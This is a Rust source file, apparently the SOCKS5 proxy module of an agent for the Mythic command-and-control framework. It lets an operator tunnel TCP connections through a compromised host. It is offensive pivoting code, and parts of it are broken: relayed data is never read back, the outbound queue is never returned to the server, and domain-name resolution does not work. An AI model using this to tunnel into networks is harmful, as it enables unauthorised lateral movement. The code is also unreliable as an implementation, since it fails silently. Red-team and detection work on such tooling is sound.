use crate::agent::AgentTask;
use crate::mythic_continued;
use base64::{engine::general_purpose, Engine as _};
use serde::Deserialize;
use std::collections::HashMap;
use std::error::Error;
use std::net::{Ipv4Addr, SocketAddr};
use std::sync::{
    atomic::{AtomicBool, Ordering},
    mpsc,
};
use std::sync::Arc;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio::sync::mpsc as async_mpsc;

#[derive(Deserialize)]
struct SocksMsg {
    exit: bool,
    server_id: u32,
    data: String, // base64
}

#[derive(Deserialize)]
struct SocksInitMsg {
    port: u32,
}

// SOCKS state shared between tasker and background thread
pub struct SocksState {
    pub connections: Arc<std::sync::Mutex<HashMap<u32, (tokio::net::tcp::OwnedWriteHalf, async_mpsc::Receiver<Vec<u8>>)>>> ,
    pub outbound: Arc<std::sync::Mutex<Vec<SocksMsg>>>,
}

impl SocksState {
    pub fn new() -> Self {
        Self {
            connections: Arc::new(std::sync::Mutex::new(HashMap::new())),
            outbound: Arc::new(std::sync::Mutex::new(Vec::new())),
        }
    }
}

/// Background task to handle SOCKS proxying
pub fn start_socks(
    tx: &mpsc::Sender<serde_json::Value>,
    rx: mpsc::Receiver<serde_json::Value>,
    socks_state: Arc<SocksState>,
) -> Result<(), Box<dyn Error>> {
    let task: AgentTask = serde_json::from_value(rx.recv()?)?;
    let args: SocksInitMsg = serde_json::from_str(&task.parameters)?;
    
    // Notify Mythic SOCKS started
    tx.send(mythic_continued!(
        task.id,
        "success",
        format!("SOCKS proxy listening on port {}", args.port)
    ))?;

    let rt = tokio::runtime::Runtime::new()?;
    rt.block_on(async {
        process_socks_loop(tx.clone(), rx, socks_state).await;
        Ok(())
    })
}

async fn process_socks_loop(
    tx: mpsc::Sender<serde_json::Value>,
    mut rx: mpsc::Receiver<serde_json::Value>,
    socks_state: Arc<SocksState>,
) {
    while let Ok(msg) = rx.recv() {
        if let Ok(task) = serde_json::from_value::<AgentTask>(msg) {
            if task.command == "socks_data" {
                if let Ok(data) = serde_json::from_str::<Vec<SocksMsg>>(&task.parameters) {
                    process_socks_messages(&socks_state, data).await;
                }
            }
        }
    }
}

async fn process_socks_messages(state: &Arc<SocksState>, msgs: Vec<SocksMsg>) {
    let mut conns = state.connections.lock().unwrap();
    let mut outbound = state.outbound.lock().unwrap();
    
    for msg in msgs {
        if msg.exit {
            if let Some((mut write, _)) = conns.remove(&msg.server_id) {
                let _ = write.shutdown().await;
            }
            outbound.push(msg);
            continue;
        }

        if conns.contains_key(&msg.server_id) {
            // Existing connection - write data
            let data = general_purpose::STANDARD.decode(&msg.data).unwrap_or_default();
            if let Some((mut write, _)) = conns.get_mut(&msg.server_id) {
                let _ = write.write_all(&data).await;
            }
        } else {
            // New connection - parse SOCKS5 request
            handle_new_socks_connection(&mut conns, &mut outbound, msg).await;
        }
    }
}

async fn handle_new_socks_connection(
    conns: &mut HashMap<u32, (tokio::net::tcp::OwnedWriteHalf, async_mpsc::Receiver<Vec<u8>>)>,
    outbound: &mut Vec<SocksMsg>,
    msg: SocksMsg,
) {
    let raw_data = match general_purpose::STANDARD.decode(&msg.data) {
        Ok(d) => d,
        Err(_) => {
            send_error_reply(outbound, msg.server_id, 1).await; // General failure
            return;
        }
    };

    if raw_data.len() < 6 || raw_data[0] != 5 {
        send_error_reply(outbound, msg.server_id, 1).await;
        return;
    }

    if raw_data[1] != 1 { // Only CONNECT
        send_error_reply(outbound, msg.server_id, 7).await; // Cmd not supported
        return;
    }

    let addr = parse_socks_address(&raw_data);
    let addr = match addr {
        Some(a) => a,
        None => {
            send_error_reply(outbound, msg.server_id, 8).await; // Address type not supported
            return;
        }
    };

    match TcpStream::connect(addr).await {
        Ok(stream) => {
            let (read, write) = stream.into_split();
            let (tx, rx) = async_mpsc::channel(100);
            
            // Spawn reader task
            tokio::spawn(async move {
                let mut buf = vec![0u8; 4096];
                loop {
                    match read.read(&mut buf).await {
                        Ok(0) => { let _ = tx.send(vec![]).await; break; }
                        Ok(n) => { let _ = tx.send(buf[..n].to_vec()).await; }
                        Err(_) => { let _ = tx.send(vec![]).await; break; }
                    }
                }
            });

            conns.insert(msg.server_id, (write, rx));
            send_success_reply(outbound, msg.server_id).await;
        }
        Err(_) => send_error_reply(outbound, msg.server_id, 4).await, // Host unreachable
    }
}

fn parse_socks_address(data: &[u8]) -> Option<SocketAddr> {
    let mut idx = 4;
    if idx + 2 > data.len() { return None; }
    
    match data[3] {
        1 => { // IPv4
            if idx + 6 > data.len() { return None; }
            let ip = Ipv4Addr::new(data[idx], data[idx+1], data[idx+2], data[idx+3]);
            idx += 4;
            let port = u16::from_be_bytes([data[idx], data[idx+1]]);
            Some(SocketAddr::from((ip, port)))
        }
        3 => { // Domain
            if idx >= data.len() { return None; }
            let len = data[idx] as usize;
            idx += 1;
            if idx + len + 2 > data.len() { return None; }
            let domain = String::from_utf8_lossy(&data[idx..idx+len]);
            idx += len;
            let port = u16::from_be_bytes([data[idx], data[idx+1]]);
            // Simple resolution - use tokio::net::lookup_host in real impl
            format!("{}:{}", domain, port).parse().ok()
        }
        _ => None,
    }
}

async fn send_success_reply(outbound: &mut Vec<SocksMsg>, server_id: u32) {
    let reply = vec![5, 0, 0, 1, 0, 0, 0, 0, 0, 0]; // Success, bind 0.0.0.0:0
    outbound.push(SocksMsg {
        exit: false,
        server_id,
        data: general_purpose::STANDARD.encode(&reply),
    });
}

async fn send_error_reply(outbound: &mut Vec<SocksMsg>, server_id: u32, rep: u8) {
    let reply = vec![5, rep, 0, 1, 0, 0, 0, 0, 0, 0];
    outbound.push(SocksMsg {
        exit: true,
        server_id,
        data: general_purpose::STANDARD.encode(&reply),
    });
}
